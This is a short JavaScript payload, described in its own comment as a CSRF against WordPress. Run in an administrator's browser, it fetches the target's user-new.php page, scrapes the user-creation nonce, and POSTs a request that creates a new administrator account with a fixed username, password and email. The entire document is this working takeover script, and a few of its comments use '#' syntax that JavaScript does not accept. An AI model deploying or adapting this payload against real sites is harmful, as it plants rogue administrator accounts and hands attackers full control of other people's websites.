#CSRF targeting Wordpress hosts add new administrative user whose name is Mud
target = "https://primus.sucks/wp-admin/user-new.php";
var login = "Mud";
var pass = "MyPatentShoes";
var email =  "AlowishusDevadanderAbercrombie@mud.mud";

function httpGet(target)
{
        #Request the user-new.php page on target domain
		    var xmlHttp = new XMLHttpRequest();
		    xmlHttp.open("GET", target, false); // false indicates synchronous request
		    xmlHttp.send(null);
		    return xmlHttp.responseText;
}
var response = httpGet(target);
var nonce = response.split("name=\"_wpnonce_create-user\" value=\""); // Read HTML response body, identify CSRF token “_wpnonce_create-user”
var nonce = nonce[1].slice(0, 10); // Parse out this variable and store it as “nonce”
var http = new XMLHttpRequest();
var params = "action=createuser&_wpnonce_create-user=" + nonce + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" + login + "&email=" + email + "&first_name=&last_name=&url=&pass1=" + pass + "&pass1-text=" + pass + "&pass2=" + pass + "&pw_weak=on&role=administrator&createuser=Add+New+User";
http.open("POST", target, true); // POST request with the details for Alowishus Devadander Abercrombie (That's long for Mud, so I've been told) with extracted nonce as “_wpnonce_create-user” parameter parameter
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); // Request body sent will be url-encoded by default
http.send(params);
